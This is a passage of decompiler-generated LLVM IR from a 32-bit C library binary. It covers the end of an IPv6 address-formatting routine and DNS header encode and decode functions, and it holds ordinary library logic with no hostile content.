dec_label_pc_8057f59:                             ; preds = %dec_label_pc_8057f54
  %v2_8057f59 = sub i32 %v0_8057f6e64, %v1_8057f6463
  %v8_8057f59 = xor i32 %v0_8057f6e64, %v1_8057f6463
  %v9_8057f59 = xor i32 %v2_8057f59, %v0_8057f6e64
  %v10_8057f59 = and i32 %v9_8057f59, %v8_8057f59
  %v11_8057f59 = icmp slt i32 %v10_8057f59, 0
  %v12_8057f59 = icmp eq i32 %v2_8057f59, 0
  %v13_8057f59 = icmp slt i32 %v2_8057f59, 0
  %v2_8057f5b = icmp eq i1 %v13_8057f59, %v11_8057f59
  br i1 %v2_8057f5b, label %dec_label_pc_8057f5d, label %dec_label_pc_8057f6e

dec_label_pc_8057f5d:                             ; preds = %dec_label_pc_8057f59
  %v1_8057f5d = load i32, i32* @ebp, align 4
  %v2_8057f5d = add i32 %v1_8057f5d, %v1_8057f6463
  store i32 %v2_8057f5d, i32* %eax.global-to-local, align 4
  %v2_8057f60 = sub i32 %v0_8057f6e64, %v2_8057f5d
  %v8_8057f60 = xor i32 %v2_8057f5d, %v0_8057f6e64
  %v9_8057f60 = xor i32 %v2_8057f60, %v0_8057f6e64
  %v10_8057f60 = and i32 %v9_8057f60, %v8_8057f60
  %v11_8057f60 = icmp slt i32 %v10_8057f60, 0
  %v13_8057f60 = icmp slt i32 %v2_8057f60, 0
  %v2_8057f62 = icmp eq i1 %v13_8057f60, %v11_8057f60
  br i1 %v2_8057f62, label %dec_label_pc_8057f6e, label %dec_label_pc_8057f64

dec_label_pc_8057f64:                             ; preds = %dec_label_pc_8057f5d
  %v1_8057f66 = icmp eq i1 %v12_8057f59, false
  br i1 %v1_8057f66, label %dec_label_pc_8057fdf, label %dec_label_pc_8057f68

dec_label_pc_8057f68:                             ; preds = %dec_label_pc_8057f64
  %v1_8057f68 = inttoptr i32 %v0_8057f7262 to i8*
  store i8 58, i8* %v1_8057f68, align 1
  %v0_8057f6b = load i32, i32* @ebx, align 4
  %v1_8057f6b = add i32 %v0_8057f6b, 1
  store i32 %v1_8057f6b, i32* @ebx, align 4
  br label %dec_label_pc_8057fdf

dec_label_pc_8057f6e:                             ; preds = %dec_label_pc_8057f59, %dec_label_pc_8057f5d, %dec_label_pc_8057f54
  %v1_8057f6e = icmp eq i32 %v0_8057f6e64, 0
  br i1 %v1_8057f6e, label %dec_label_pc_8057f76, label %dec_label_pc_8057f72

dec_label_pc_8057f72:                             ; preds = %dec_label_pc_8057f6e
  %v1_8057f72 = inttoptr i32 %v0_8057f7262 to i8*
  store i8 58, i8* %v1_8057f72, align 1
  %v0_8057f75 = load i32, i32* @ebx, align 4
  %v1_8057f75 = add i32 %v0_8057f75, 1
  store i32 %v1_8057f75, i32* @ebx, align 4
  %v0_8057f76.pre = load i32, i32* @esi, align 4
  br label %dec_label_pc_8057f76

dec_label_pc_8057f76:                             ; preds = %dec_label_pc_8057f6e, %dec_label_pc_8057f72
  %v0_8057fd4 = phi i32 [ %v0_8057f7262, %dec_label_pc_8057f6e ], [ %v1_8057f75, %dec_label_pc_8057f72 ]
  %v1_8057fcb = phi i32 [ 0, %dec_label_pc_8057f6e ], [ %v0_8057f76.pre, %dec_label_pc_8057f72 ]
  %v9_8057f76 = icmp eq i32 %v1_8057fcb, 6
  %v1_8057f79 = icmp eq i1 %v9_8057f76, false
  br i1 %v1_8057f79, label %dec_label_pc_8057fca, label %dec_label_pc_8057f7b

dec_label_pc_8057f7b:                             ; preds = %dec_label_pc_8057f76
  %v0_8057f7b = load i32, i32* @edi, align 4
  %v1_8057f7b = icmp eq i32 %v0_8057f7b, 0
  %v1_8057f7d = icmp eq i1 %v1_8057f7b, false
  br i1 %v1_8057f7d, label %dec_label_pc_8057fca, label %dec_label_pc_8057f7f

dec_label_pc_8057f7f:                             ; preds = %dec_label_pc_8057f7b
  %v0_8057f7f = load i32, i32* @ebp, align 4
  %v9_8057f7f = icmp eq i32 %v0_8057f7f, 6
  br i1 %v9_8057f7f, label %dec_label_pc_8057f93, label %dec_label_pc_8057f84

dec_label_pc_8057f84:                             ; preds = %dec_label_pc_8057f7f
  %v9_8057f84 = icmp eq i32 %v0_8057f7f, 5
  %v1_8057f87 = icmp eq i1 %v9_8057f84, false
  br i1 %v1_8057f87, label %dec_label_pc_8057fca, label %dec_label_pc_8057f89

dec_label_pc_8057f89:                             ; preds = %dec_label_pc_8057f84
  br i1 %v1_8057f91, label %dec_label_pc_8057fca, label %dec_label_pc_8057f93

dec_label_pc_8057f93:                             ; preds = %dec_label_pc_8057f89, %dec_label_pc_8057f7f
  %v2_8057f99 = sub i32 %v0_8057fd4, %v2_8057f49
  store i32 %v2_8057f99, i32* @esi, align 4
  %v2_8057fa4 = sub i32 46, %v2_8057f99
  store i32 %v2_8057fa4, i32* @ecx, align 4
  store i32 %v0_8057fd4, i32* @edx, align 4
  %v1_8057fa8 = add i32 %arg2, 12
  store i32 %v1_8057fa8, i32* @eax, align 4
  %v0_8057fab = load i8*, i8** %stack_var_-124, align 4
  %v1_8057fab = ptrtoint i8* %v0_8057fab to i32
  %v3_8057fab = ptrtoint i8* %stack_var_-120.161 to i32
  %v5_8057fab = call i32 @inet_ntop4(i32 %v1_8057fab, i32 %v3_8057fab, i32 %stack_var_-116.160)
  store i32 %v5_8057fab, i32* %eax.global-to-local, align 4
  store i32 0, i32* %edx.global-to-local, align 4
  %v1_8057fb2 = icmp eq i32 %v5_8057fab, 0
  br i1 %v1_8057fb2, label %dec_label_pc_805803c, label %dec_label_pc_8057fba

dec_label_pc_8057fba:                             ; preds = %dec_label_pc_8057f93
  %v0_8057fbd = load i32, i32* @ebx, align 4
  %v5_8057fbd = inttoptr i32 %v0_8057fbd to i8*
  store i8* %v5_8057fbd, i8** %stack_var_-124, align 4
  %v3_8057fbe = call i32 @strlen(i8* %v5_8057fbd)
  store i32 %v3_8057fbe, i32* %eax.global-to-local, align 4
  %v0_8057fc6 = load i32, i32* @ebx, align 4
  %v3_8057fc6 = add i32 %v0_8057fc6, %v3_8057fbe
  store i32 %v3_8057fc6, i32* @ebx, align 4
  %v0_8057fee.pre = load i32, i32* @edi, align 4
  br label %dec_label_pc_8057fee

dec_label_pc_8057fca:                             ; preds = %dec_label_pc_8057f89, %dec_label_pc_8057f84, %dec_label_pc_8057f7b, %dec_label_pc_8057f76
  %v0_8057fca = load i32, i32* %eax.global-to-local, align 4
  store i32 %v0_8057fca, i32* %stack_var_-112, align 4
  %v2_8057fcb = mul i32 %v1_8057fcb, 4
  %v4_8057fcb = add i32 %v3_8057fcb, %v2_8057fcb
  %v5_8057fcb = inttoptr i32 %v4_8057fcb to i32*
  %v6_8057fcb = load i32, i32* %v5_8057fcb, align 4
  %v5_8057fd4 = inttoptr i32 %v0_8057fd4 to i8*
  store i8* %v5_8057fd4, i8** %stack_var_-124, align 4
  %v4_8057fd5 = call i32 @sprintf(i32 %v0_8057fd4, i32 ptrtoint ([3 x i8]* @global_var_805eeb1.1034 to i32))
  store i32 %v4_8057fd5, i32* %eax.global-to-local, align 4
  %v0_8057fdd = load i32, i32* @ebx, align 4
  %v2_8057fdd = add i32 %v0_8057fdd, %v4_8057fd5
  store i32 %v2_8057fdd, i32* @ebx, align 4
  br label %dec_label_pc_8057fdf

dec_label_pc_8057fdf:                             ; preds = %dec_label_pc_8057f64, %dec_label_pc_8057f68, %dec_label_pc_8057fca
  %stack_var_-116.0 = phi i32 [ %v6_8057fcb, %dec_label_pc_8057fca ], [ %stack_var_-116.160, %dec_label_pc_8057f64 ], [ %stack_var_-116.160, %dec_label_pc_8057f68 ]
  %stack_var_-120.0 = phi i8* [ getelementptr inbounds ([3 x i8], [3 x i8]* @global_var_805eeb1.1034, i32 0, i32 0), %dec_label_pc_8057fca ], [ %stack_var_-120.161, %dec_label_pc_8057f64 ], [ %stack_var_-120.161, %dec_label_pc_8057f68 ]
  %v0_8057f6819 = phi i32 [ %v2_8057fdd, %dec_label_pc_8057fca ], [ %v0_8057f7262, %dec_label_pc_8057f64 ], [ %v1_8057f6b, %dec_label_pc_8057f68 ]
  %v0_8057fdf = load i32, i32* @esi, align 4
  %v1_8057fdf = add i32 %v0_8057fdf, 1
  %v0_8057fe9.pre = load i32, i32* @edi, align 4
  store i32 %v1_8057fdf, i32* @esi, align 4
  %v7_8057fe3 = icmp sgt i32 %v1_8057fdf, 7
  %v10_8057fe9 = icmp eq i32 %v0_8057fe9.pre, -1
  br i1 %v7_8057fe3, label %dec_label_pc_8057fe9, label %dec_label_pc_8057f54

dec_label_pc_8057fe9:                             ; preds = %dec_label_pc_8057fdf
  br i1 %v10_8057fe9, label %dec_label_pc_8057ffa, label %dec_label_pc_8057fee

dec_label_pc_8057fee:                             ; preds = %dec_label_pc_8057fe9, %dec_label_pc_8057fba
  %v0_8057ff6 = phi i32 [ %v0_8057f6819, %dec_label_pc_8057fe9 ], [ %v3_8057fc6, %dec_label_pc_8057fba ]
  %v0_8057fee = phi i32 [ %v0_8057fe9.pre, %dec_label_pc_8057fe9 ], [ %v0_8057fee.pre, %dec_label_pc_8057fba ]
  %v1_8057fee = load i32, i32* @ebp, align 4
  %v2_8057fee = add i32 %v1_8057fee, %v0_8057fee
  store i32 %v2_8057fee, i32* %eax.global-to-local, align 4
  %v9_8057ff1 = icmp eq i32 %v2_8057fee, 8
  %v1_8057ff4 = icmp eq i1 %v9_8057ff1, false
  br i1 %v1_8057ff4, label %dec_label_pc_8057ffa, label %dec_label_pc_8057ff6

dec_label_pc_8057ff6:                             ; preds = %dec_label_pc_8057fee
  %v1_8057ff6 = inttoptr i32 %v0_8057ff6 to i8*
  store i8 58, i8* %v1_8057ff6, align 1
  %v0_8057ff9 = load i32, i32* @ebx, align 4
  %v1_8057ff9 = add i32 %v0_8057ff9, 1
  store i32 %v1_8057ff9, i32* %ebx.global-to-local, align 4
  br label %dec_label_pc_8057ffa

dec_label_pc_8057ffa:                             ; preds = %dec_label_pc_8057fee, %dec_label_pc_8057fe9, %dec_label_pc_8057ff6
  %v0_8057ffe = phi i32 [ %v0_8057ff6, %dec_label_pc_8057fee ], [ %v0_8057f6819, %dec_label_pc_8057fe9 ], [ %v1_8057ff9, %dec_label_pc_8057ff6 ]
  store i32 %v2_8057f49, i32* %edx.global-to-local, align 4
  %v1_8057ffe = add i32 %v0_8057ffe, 1
  store i32 %v1_8057ffe, i32* %eax.global-to-local, align 4
  %v1_8058001 = inttoptr i32 %v0_8057ffe to i8*
  store i8 0, i8* %v1_8058001, align 1
  %v0_8058004 = load i32, i32* %eax.global-to-local, align 4
  %v1_8058004 = load i32, i32* %edx.global-to-local, align 4
  %v2_8058004 = sub i32 %v0_8058004, %v1_8058004
  store i32 %v2_8058004, i32* @eax, align 4
  %tmp75 = icmp ugt i32 %v2_8058004, %arg4
  br i1 %tmp75, label %dec_label_pc_805800c, label %dec_label_pc_8058019

dec_label_pc_805800c:                             ; preds = %dec_label_pc_8057ffa
  %v0_805800c = load i8*, i8** %stack_var_-124, align 4
  %v1_805800c = ptrtoint i8* %v0_805800c to i32
  %v2_805800c = call i32 @__errno_location(i32 %v1_805800c)
  store i32 %v2_805800c, i32* %eax.global-to-local, align 4
  %v1_8058011 = inttoptr i32 %v2_805800c to i32*
  store i32 28, i32* %v1_8058011, align 4
  br label %dec_label_pc_805803a

dec_label_pc_8058019:                             ; preds = %dec_label_pc_8057ffa
  %v0_8058019 = load i32, i32* @edi, align 4
  store i32 %v0_8058019, i32* %stack_var_-112, align 4
  %tmp45 = bitcast i8** %stack_var_12 to i32*
  %v3_805801c2 = load i32, i32* %tmp45, align 4
  %tmp46 = bitcast i8** %stack_var_-124 to i32*
  store i32 %v3_805801c2, i32* %tmp46, align 4
  %v0_8058023.cast = inttoptr i32 %v3_805801c2 to i8*
  %v5_8058023 = call i32 @strcpy(i8* %v0_8058023.cast, i32 %v2_8057f49)
  store i32 %v5_8058023, i32* %eax.global-to-local, align 4
  store i32 %v5_8058023, i32* %edx.global-to-local, align 4
  br label %dec_label_pc_805803c

dec_label_pc_805802f:                             ; preds = %dec_label_pc_8057e85
  %v1_805802f = call i32 @__errno_location(i32 %v0_8057e78)
  store i32 %v1_805802f, i32* %eax.global-to-local, align 4
  %v1_8058034 = inttoptr i32 %v1_805802f to i32*
  store i32 97, i32* %v1_8058034, align 4
  br label %dec_label_pc_805803a

dec_label_pc_805803a:                             ; preds = %dec_label_pc_805800c, %dec_label_pc_805802f
  store i32 0, i32* %edx.global-to-local, align 4
  br label %dec_label_pc_805803c

dec_label_pc_805803c:                             ; preds = %dec_label_pc_8057f93, %dec_label_pc_8058019, %dec_label_pc_8057e90, %dec_label_pc_805803a
  %v0_805803f = phi i32 [ 0, %dec_label_pc_8057f93 ], [ %v5_8058023, %dec_label_pc_8058019 ], [ %v3_8057e9c, %dec_label_pc_8057e90 ], [ 0, %dec_label_pc_805803a ]
  store i32 %v0_805803f, i32* %eax.global-to-local, align 4
  store i32 %v0_8057e78, i32* %ebx.global-to-local, align 4
  ret i32 %v0_805803f

; uselistorder directives
  uselistorder i32 %v0_805803f, { 1, 0 }
  uselistorder i32 %v0_8057ffe, { 1, 0 }
  uselistorder i1 %v10_8057fe9, { 1, 0 }
  uselistorder i32 %v0_8057fe9.pre, { 1, 0, 2 }
  uselistorder i32 %v1_8057fdf, { 1, 0, 2 }
  uselistorder i32 %v1_8057fcb, { 1, 0 }
  uselistorder i32 %v0_8057fd4, { 3, 2, 0, 1 }
  uselistorder i32 %v2_8057f60, { 1, 0 }
  uselistorder i32 %v2_8057f59, { 1, 2, 0 }
  uselistorder i32 %stack_var_-116.160, { 2, 1, 0 }
  uselistorder i8* %stack_var_-120.161, { 2, 1, 0 }
  uselistorder i32 %v0_8057f7262, { 3, 2, 1, 0 }
  uselistorder i32 %v1_8057f6463, { 2, 1, 0 }
  uselistorder i32 %v0_8057f6e64, { 2, 6, 5, 1, 4, 3, 0 }
  uselistorder i32 %v2_8057f49, { 1, 3, 2, 0, 4 }
  uselistorder i32 %v0_8057fe918, { 1, 0 }
  uselistorder i32 %v1_8057f3e, { 1, 0 }
  uselistorder i32 %v0_8057f3e, { 1, 0, 2 }
  uselistorder i32 %v5_8057f46, { 1, 2, 0 }
  uselistorder i32 %v1_8057f21, { 0, 2, 1 }
  uselistorder i32 %v0_8057f119, { 1, 2, 0, 3 }
  uselistorder i32 %v0_8057f1c13, { 1, 2, 0, 3 }
  uselistorder i1 %v10_8057f0c, { 1, 0 }
  uselistorder i32 %v0_8057f3766, { 1, 0, 3, 2 }
  uselistorder i32 %v0_8057f2c67, { 2, 1, 0, 4, 3 }
  uselistorder i32 %v0_8057f2169, { 4, 1, 3, 2, 0 }
  uselistorder i32 %v0_8057ed970, { 3, 2, 4, 0, 1 }
  uselistorder i32 %v0_8057e78, { 0, 2, 1 }
  uselistorder i32* %stack_var_-112, { 0, 1, 3, 2 }
  uselistorder i8** %stack_var_-124, { 0, 5, 3, 2, 4, 1 }
  uselistorder i32* %ebx.global-to-local, { 0, 1, 5, 6, 2, 4, 3, 7 }
  uselistorder i32* %eax.global-to-local, { 0, 1, 2, 5, 3, 4, 6, 7, 14, 8, 9, 10, 11, 12, 13, 15, 16, 17, 18, 19, 20, 21, 22 }
  uselistorder i32 97, { 5, 6, 4, 0, 3, 2, 1 }
  uselistorder i32 (i32, i32)* @sprintf, { 4, 3, 2, 1, 0 }
  uselistorder [3 x i8]* @global_var_805eeb1.1034, { 1, 0 }
  uselistorder i8 58, { 4, 5, 6, 0, 1, 2, 3 }
  uselistorder i32 64, { 8, 0, 3, 10, 7, 9, 6, 2, 4, 5, 1 }
  uselistorder i32* @esp, { 0, 1, 120, 7, 121, 122, 123, 124, 125, 126, 8, 266, 267, 268, 269, 270, 271, 272, 10, 273, 274, 275, 276, 277, 16, 278, 279, 280, 281, 282, 283, 284, 285, 286, 287, 12, 288, 289, 290, 13, 291, 9, 292, 293, 294, 295, 296, 297, 14, 298, 299, 300, 301, 302, 303, 304, 305, 306, 307, 308, 309, 310, 11, 311, 312, 313, 314, 315, 316, 15, 317, 318, 319, 320, 321, 322, 323, 324, 325, 326, 327, 328, 329, 330, 331, 332, 333, 334, 335, 336, 337, 338, 17, 339, 2, 3, 382, 4, 5, 6, 18, 340, 341, 342, 343, 19, 344, 345, 346, 347, 22, 348, 349, 350, 23, 351, 24, 352, 353, 354, 355, 356, 357, 358, 359, 360, 361, 362, 363, 364, 21, 365, 25, 366, 367, 368, 369, 370, 371, 372, 373, 374, 375, 376, 377, 20, 378, 379, 380, 381, 127, 159, 128, 129, 130, 131, 132, 133, 134, 135, 136, 137, 138, 139, 140, 141, 142, 143, 144, 145, 146, 147, 148, 149, 150, 151, 152, 153, 154, 155, 156, 157, 158, 160, 161, 162, 163, 164, 165, 198, 166, 167, 168, 169, 170, 171, 172, 173, 174, 175, 176, 177, 178, 179, 180, 181, 182, 183, 184, 185, 186, 187, 188, 189, 190, 191, 192, 193, 194, 195, 196, 197, 199, 200, 201, 202, 203, 204, 205, 206, 207, 208, 209, 210, 211, 212, 213, 214, 215, 216, 217, 218, 219, 220, 221, 222, 223, 224, 225, 226, 227, 228, 229, 230, 231, 232, 233, 234, 235, 236, 237, 238, 239, 240, 241, 242, 243, 244, 245, 246, 247, 248, 249, 250, 251, 252, 253, 254, 255, 256, 257, 258, 259, 260, 261, 262, 263, 26, 27, 28, 29, 30, 31, 32, 33, 34, 35, 36, 37, 38, 39, 40, 41, 42, 43, 44, 45, 46, 47, 48, 49, 50, 51, 52, 53, 54, 55, 56, 57, 58, 59, 60, 61, 62, 63, 64, 65, 66, 67, 68, 69, 70, 71, 72, 73, 74, 75, 76, 77, 78, 79, 80, 81, 82, 83, 84, 85, 86, 87, 88, 89, 90, 91, 92, 93, 94, 95, 96, 97, 98, 99, 100, 101, 102, 103, 104, 105, 106, 107, 108, 109, 110, 111, 112, 113, 114, 115, 116, 117, 118, 119, 264, 265 }
  uselistorder i32 15, { 1, 5, 9, 8, 2, 7, 6, 3, 4, 0 }
  uselistorder i32 60, { 6, 7, 8, 9, 1, 10, 4, 3, 2, 5, 0 }
  uselistorder i64 2, { 1, 0 }
  uselistorder i64 4294967296, { 0, 1, 2, 3, 4, 5, 6, 7, 8, 10, 9 }
  uselistorder i32 (i8*, i32, i32)* @__GI_memset, { 1, 10, 11, 12, 13, 21, 19, 18, 20, 14, 2, 3, 4, 5, 6, 7, 8, 0, 9, 15, 16, 17 }
  uselistorder i32 (i32, i32, i32)* @inet_ntop4, { 1, 0 }
  uselistorder i32 %arg2, { 1, 0, 4, 2, 3 }
  uselistorder i32 %arg1, { 2, 0, 1, 3 }
  uselistorder label %dec_label_pc_805803c, { 3, 1, 0, 2 }
  uselistorder label %dec_label_pc_805803a, { 1, 0 }
  uselistorder label %dec_label_pc_8057ffa, { 2, 0, 1 }
  uselistorder label %dec_label_pc_8057fdf, { 2, 1, 0 }
  uselistorder label %dec_label_pc_8057f76, { 1, 0 }
  uselistorder label %dec_label_pc_8057f6e, { 1, 0, 2 }
  uselistorder label %dec_label_pc_8057f54, { 1, 0 }
  uselistorder label %dec_label_pc_8057f49, { 1, 0 }
  uselistorder label %dec_label_pc_8057f39, { 2, 0, 1 }
  uselistorder label %dec_label_pc_8057f35, { 1, 0 }
  uselistorder label %dec_label_pc_8057f21, { 3, 0, 1, 2 }
  uselistorder label %dec_label_pc_8057f1e, { 1, 0 }
  uselistorder label %dec_label_pc_8057ef4, { 1, 0 }
}

define i32 @__encode_header() local_unnamed_addr {
entry:
  %ebx.global-to-local = alloca i32, align 4
  %edx.global-to-local = alloca i32, align 4
  %esi.global-to-local = alloca i32, align 4
  %tmp = call i8* @__decompiler_undefined_function_2()
  %tmp8 = call i32 @__decompiler_undefined_function_0()
  %tmp9 = call i32 @__decompiler_undefined_function_0()
  %stack_var_-8 = alloca i32, align 4
  %v0_805804c = load i32, i32* @ebx, align 4
  store i32 %v0_805804c, i32* %stack_var_-8, align 4
  store i32 %tmp8, i32* %ebx.global-to-local, align 4
  %v4_8058056 = ptrtoint i8* %tmp to i32
  store i32 %v4_8058056, i32* %esi.global-to-local, align 4
  %v7_805805a = icmp sgt i32 %tmp9, 11
  br i1 %v7_805805a, label %dec_label_pc_8058060, label %dec_label_pc_80580f4

dec_label_pc_8058060:                             ; preds = %entry
  %v1_8058060 = add i32 %tmp8, 1
  %v2_8058060 = inttoptr i32 %v1_8058060 to i8*
  %v3_8058060 = load i8, i8* %v2_8058060, align 1
  store i8 %v3_8058060, i8* %tmp, align 1
  %v0_8058066 = load i32, i32* %ebx.global-to-local, align 4
  %v1_8058066 = inttoptr i32 %v0_8058066 to i32*
  %v2_8058066 = load i32, i32* %v1_8058066, align 4
  %v1_8058068 = trunc i32 %v2_8058066 to i8
  %v2_8058068 = load i32, i32* %esi.global-to-local, align 4
  %v3_8058068 = add i32 %v2_8058068, 1
  %v4_8058068 = inttoptr i32 %v3_8058068 to i8*
  store i8 %v1_8058068, i8* %v4_8058068, align 1
  store i32 4, i32* %edx.global-to-local, align 4
  %v0_805808d = load i32, i32* %ebx.global-to-local, align 4
  %v1_805808d = add i32 %v0_805808d, 8
  %v2_805808d = inttoptr i32 %v1_805808d to i32*
  %v3_805808d = load i32, i32* %v2_805808d, align 4
  %v1_8058090 = mul i32 %v3_805808d, 8
  %v2_8058093 = and i32 %v1_8058090, 120
  %v2_8058096 = or i32 %v2_8058093, 4
  store i32 %v2_8058096, i32* %edx.global-to-local, align 4
  %v1_8058098 = add i32 %v0_805808d, 20
  %v2_8058098 = inttoptr i32 %v1_8058098 to i32*
  %v3_8058098 = load i32, i32* %v2_8058098, align 4
  %v4_8058098 = icmp eq i32 %v3_8058098, 0
  %v1_805809c = icmp eq i1 %v4_8058098, false
  %v2_805809c = zext i1 %v1_805809c to i32
  %v2_805809f = or i32 %v2_805809c, %v2_8058096
  store i32 %v2_805809f, i32* %edx.global-to-local, align 4
  %v2_80580a1 = or i32 %v2_805809f, 130
  %v3_80580a1 = trunc i32 %v2_80580a1 to i8
  store i32 %v2_80580a1, i32* @ecx, align 4
  %v2_80580a3 = load i32, i32* %esi.global-to-local, align 4
  %v3_80580a3 = add i32 %v2_80580a3, 2
  %v4_80580a3 = inttoptr i32 %v3_80580a3 to i8*
  store i8 %v3_80580a1, i8* %v4_80580a3, align 1
  %v0_80580a6 = load i32, i32* %ebx.global-to-local, align 4
  %v1_80580aa = add i32 %v0_80580a6, 28
  %v2_80580aa = inttoptr i32 %v1_80580aa to i8*
  %v3_80580aa = load i8, i8* %v2_80580aa, align 1
  %v5_80580aa = load i32, i32* %edx.global-to-local, align 4
  %v2_80580b3 = urem i8 %v3_80580aa, 16
  %v7_80580b3 = zext i8 %v2_80580b3 to i32
  %v9_80580b3 = and i32 %v5_80580aa, -256
  %v10_80580b3 = or i32 %v9_80580b3, %v7_80580b3
  store i32 %v10_80580b3, i32* %edx.global-to-local, align 4
  %v2_80580b6 = or i8 %v2_80580b3, -128
  %v2_80580b8 = load i32, i32* %esi.global-to-local, align 4
  %v3_80580b8 = add i32 %v2_80580b8, 3
  %v4_80580b8 = inttoptr i32 %v3_80580b8 to i8*
  store i8 %v2_80580b6, i8* %v4_80580b8, align 1
  %v0_80580bb = load i32, i32* %ebx.global-to-local, align 4
  %v1_80580bb = add i32 %v0_80580bb, 33
  %v2_80580bb = inttoptr i32 %v1_80580bb to i8*
  %v3_80580bb = load i8, i8* %v2_80580bb, align 1
  %v2_80580bf = load i32, i32* %esi.global-to-local, align 4
  %v3_80580bf = add i32 %v2_80580bf, 4
  %v4_80580bf = inttoptr i32 %v3_80580bf to i8*
  store i8 %v3_80580bb, i8* %v4_80580bf, align 1
  %v0_80580c2 = load i32, i32* %ebx.global-to-local, align 4
  %v1_80580c2 = add i32 %v0_80580c2, 32
  %v2_80580c2 = inttoptr i32 %v1_80580c2 to i32*
  %v3_80580c2 = load i32, i32* %v2_80580c2, align 4
  %v1_80580c5 = trunc i32 %v3_80580c2 to i8
  %v2_80580c5 = load i32, i32* %esi.global-to-local, align 4
  %v3_80580c5 = add i32 %v2_80580c5, 5
  %v4_80580c5 = inttoptr i32 %v3_80580c5 to i8*
  store i8 %v1_80580c5, i8* %v4_80580c5, align 1
  %v0_80580c8 = load i32, i32* %ebx.global-to-local, align 4
  %v1_80580c8 = add i32 %v0_80580c8, 37
  %v2_80580c8 = inttoptr i32 %v1_80580c8 to i8*
  %v3_80580c8 = load i8, i8* %v2_80580c8, align 1
  %v2_80580cc = load i32, i32* %esi.global-to-local, align 4
  %v3_80580cc = add i32 %v2_80580cc, 6
  %v4_80580cc = inttoptr i32 %v3_80580cc to i8*
  store i8 %v3_80580c8, i8* %v4_80580cc, align 1
  %v0_80580cf = load i32, i32* %ebx.global-to-local, align 4
  %v1_80580cf = add i32 %v0_80580cf, 36
  %v2_80580cf = inttoptr i32 %v1_80580cf to i32*
  %v3_80580cf = load i32, i32* %v2_80580cf, align 4
  %v1_80580d2 = trunc i32 %v3_80580cf to i8
  %v2_80580d2 = load i32, i32* %esi.global-to-local, align 4
  %v3_80580d2 = add i32 %v2_80580d2, 7
  %v4_80580d2 = inttoptr i32 %v3_80580d2 to i8*
  store i8 %v1_80580d2, i8* %v4_80580d2, align 1
  %v0_80580d5 = load i32, i32* %ebx.global-to-local, align 4
  %v1_80580d5 = add i32 %v0_80580d5, 41
  %v2_80580d5 = inttoptr i32 %v1_80580d5 to i8*
  %v3_80580d5 = load i8, i8* %v2_80580d5, align 1
  %v2_80580d9 = load i32, i32* %esi.global-to-local, align 4
  %v3_80580d9 = add i32 %v2_80580d9, 8
  %v4_80580d9 = inttoptr i32 %v3_80580d9 to i8*
  store i8 %v3_80580d5, i8* %v4_80580d9, align 1
  %v0_80580dc = load i32, i32* %ebx.global-to-local, align 4
  %v1_80580dc = add i32 %v0_80580dc, 40
  %v2_80580dc = inttoptr i32 %v1_80580dc to i32*
  %v3_80580dc = load i32, i32* %v2_80580dc, align 4
  %v1_80580df = trunc i32 %v3_80580dc to i8
  %v2_80580df = load i32, i32* %esi.global-to-local, align 4
  %v3_80580df = add i32 %v2_80580df, 9
  %v4_80580df = inttoptr i32 %v3_80580df to i8*
  store i8 %v1_80580df, i8* %v4_80580df, align 1
  %v0_80580e2 = load i32, i32* %ebx.global-to-local, align 4
  %v1_80580e2 = add i32 %v0_80580e2, 45
  %v2_80580e2 = inttoptr i32 %v1_80580e2 to i8*
  %v3_80580e2 = load i8, i8* %v2_80580e2, align 1
  %v2_80580e6 = load i32, i32* %esi.global-to-local, align 4
  %v3_80580e6 = add i32 %v2_80580e6, 10
  %v4_80580e6 = inttoptr i32 %v3_80580e6 to i8*
  store i8 %v3_80580e2, i8* %v4_80580e6, align 1
  %v0_80580e9 = load i32, i32* %ebx.global-to-local, align 4
  %v1_80580e9 = add i32 %v0_80580e9, 44
  %v2_80580e9 = inttoptr i32 %v1_80580e9 to i32*
  %v3_80580e9 = load i32, i32* %v2_80580e9, align 4
  %v1_80580ec = trunc i32 %v3_80580e9 to i8
  %v2_80580ec = load i32, i32* %esi.global-to-local, align 4
  %v3_80580ec = add i32 %v2_80580ec, 11
  %v4_80580ec = inttoptr i32 %v3_80580ec to i8*
  store i8 %v1_80580ec, i8* %v4_80580ec, align 1
  %v2_80580f4.pre = load i32, i32* %stack_var_-8, align 4
  br label %dec_label_pc_80580f4

dec_label_pc_80580f4:                             ; preds = %entry, %dec_label_pc_8058060
  %v2_80580f4 = phi i32 [ %v0_805804c, %entry ], [ %v2_80580f4.pre, %dec_label_pc_8058060 ]
  %v0_80580f6 = phi i32 [ -1, %entry ], [ 12, %dec_label_pc_8058060 ]
  store i32 %v2_80580f4, i32* %ebx.global-to-local, align 4
  ret i32 %v0_80580f6

; uselistorder directives
  uselistorder i32 45, { 5, 2, 4, 1, 0, 3 }
  uselistorder i32 41, { 2, 1, 0 }
  uselistorder i32 37, { 2, 1, 3, 0 }
  uselistorder i32 33, { 4, 3, 5, 1, 2, 0 }
  uselistorder i32 130, { 1, 2, 0 }
  uselistorder i32 120, { 1, 2, 3, 4, 5, 0 }
  uselistorder label %dec_label_pc_80580f4, { 1, 0 }
}

define i32 @__decode_header() local_unnamed_addr {
entry:
  %ebx.global-to-local = alloca i32, align 4
  %tmp = call i32 @__decompiler_undefined_function_0()
  %tmp2 = call i8* @__decompiler_undefined_function_2()
  %stack_var_-4 = alloca i32, align 4
  %v0_80580f8 = load i32, i32* @ebx, align 4
  store i32 %v0_80580f8, i32* %stack_var_-4, align 4
  %v4_80580f9 = ptrtoint i8* %tmp2 to i32
  store i32 %v4_80580f9, i32* @ecx, align 4
  store i32 %tmp, i32* %ebx.global-to-local, align 4
  %v2_8058101 = load i8, i8* %tmp2, align 1
  %v3_8058101 = zext i8 %v2_8058101 to i32
  %v1_8058104 = add i32 %v4_80580f9, 1
  %v2_8058104 = inttoptr i32 %v1_8058104 to i8*
  %v3_8058104 = load i8, i8* %v2_8058104, align 1
  %v4_8058104 = zext i8 %v3_8058104 to i32
  %v2_8058108 = mul nuw nsw i32 %v3_8058101, 256
  %v2_805810b = or i32 %v4_8058104, %v2_8058108
  %v2_805810d = inttoptr i32 %tmp to i32*
  store i32 %v2_805810b, i32* %v2_805810d, align 4
  %v0_805810f = load i32, i32* @ecx, align 4
  %v1_805810f = add i32 %v0_805810f, 2
  %v2_805810f = inttoptr i32 %v1_805810f to i8*
  %v3_805810f = load i8, i8* %v2_805810f, align 1
  %tmp6 = icmp slt i8 %v3_805810f, 0
  %v2_8058113 = zext i1 %tmp6 to i32
  %v1_8058116 = load i32, i32* %ebx.global-to-local, align 4
  %v2_8058116 = add i32 %v1_8058116, 4
  %v3_8058116 = inttoptr i32 %v2_8058116 to i32*
